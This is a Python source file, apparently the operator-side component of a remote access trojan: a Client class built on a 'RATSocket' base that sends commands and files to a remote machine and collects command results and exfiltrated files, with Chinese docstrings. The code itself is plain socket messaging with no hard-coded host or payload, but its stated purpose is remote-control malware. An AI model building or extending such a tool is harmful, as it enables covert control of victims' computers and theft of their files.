import json
import ntpath
import os

from common.ratsocket import RATSocket


class Client(RATSocket):

    def __init__(self, s, address=None, info=None):
        super().__init__()
        self.socket = s
        self.address = address
        self.info = info

    def send_command(self, command, type='command'):
        """
        向客户端发送命令
        """
        body = command.encode()
        head = {
            'type': type,
            'length': len(body)
        }
        self.send(head, body)

    def send_file(self, filename, type='file', args=None):
        """
        向客户端发送文件
        """
        head = {
            'type': type,
            'filename': ntpath.basename(filename),
            'length': os.stat(filename).st_size
        }
        if args is not None:
            head['args'] = json.dumps(args)
        with open(filename, 'rb') as file:
            self.send(head, file.read())

    def recv_result(self):
        """
        从客户端接收执行结果或文件
        """
        head, body = self.recv()
        if head['type'] == 'result':
            return head['status'], body.decode()
        elif head['type'] == 'file':
            try:
                with open(head['filename'], 'wb') as file:
                    file.write(body)
                return 1, 'File saved to: {}'.format(os.path.abspath(head['filename']))
            except Exception as e:
                return 0, str(e)
